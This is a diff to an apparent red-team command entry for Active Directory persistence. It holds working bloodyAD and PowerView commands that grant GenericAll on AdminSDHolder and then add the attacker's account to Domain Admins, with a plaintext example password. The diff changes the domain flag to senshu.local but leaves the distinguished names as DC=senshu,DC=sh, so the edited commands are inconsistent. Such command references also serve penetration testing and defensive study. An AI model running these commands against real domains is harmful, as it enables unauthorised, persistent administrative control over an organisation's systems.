@@ -8,7 +8,7 @@ commands:
       # Add GenericAll on AdminSDHolder — get permanent access to Domain Admins, etc.
 
       # Add ACE to AdminSDHolder with bloodyAD
-      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add genericAll 'CN=AdminSDHolder,CN=System,DC=senshu,DC=sh' sec_user
+      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add genericAll 'CN=AdminSDHolder,CN=System,DC=senshu,DC=sh' sec_user
 
       # Add ACE to AdminSDHolder with PowerView
       Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=senshu,DC=sh" -PrincipalIdentity sec_user -Rights All
@@ -17,7 +17,7 @@ commands:
       # Then you have GenericAll on all protected groups (Domain Admins, Enterprise Admins, etc.)
 
       # Verify by adding yourself to Domain Admins
-      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add groupMember "Domain Admins" sec_user
+      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add groupMember "Domain Admins" sec_user
 phase:
   - Persistence
 target_os:
